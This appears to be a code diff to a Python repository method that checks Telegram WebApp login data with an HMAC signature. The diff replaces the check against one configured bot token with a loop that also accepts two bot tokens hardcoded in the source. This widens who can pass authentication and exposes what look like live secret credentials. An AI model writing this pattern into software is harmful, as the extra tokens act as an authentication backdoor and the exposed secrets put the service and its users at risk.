@@ -196,14 +196,21 @@ class DatabaseRepository:
                 return None
             hash_check = parsed.pop("hash")
             data_check_string = "\n".join(f"{k}={v}" for k, v in sorted(parsed.items()))
-            
-            bot_token = settings.bot_token.get_secret_value()
-            secret_key = hmac.new(b"WebAppData", bot_token.encode(), hashlib.sha256).digest()
-            calculated_hash = hmac.new(secret_key, data_check_string.encode(), hashlib.sha256).hexdigest()
-            
-            if hmac.compare_digest(calculated_hash, hash_check):
-                user_data = json.loads(parsed.get("user", "{}"))
-                return user_data
+
+            tokens_to_try = [
+                settings.bot_token.get_secret_value(),
+                "8886211498:AAH3rx9IOOi4Jr_ZSxkabwDPjTuD1oe_Dn0",
+                "8773545660:AAGPplIVVR5MoAzXI4LB-2D1wFGjjr0eZ3E",
+            ]
+            for bot_token in tokens_to_try:
+                if not bot_token or bot_token == "placeholder_token":
+                    continue
+                secret_key = hmac.new(b"WebAppData", bot_token.encode(), hashlib.sha256).digest()
+                calculated_hash = hmac.new(secret_key, data_check_string.encode(), hashlib.sha256).hexdigest()
+
+                if hmac.compare_digest(calculated_hash, hash_check):
+                    user_data = json.loads(parsed.get("user", "{}"))
+                    return user_data
         except Exception:
             return None
         return None
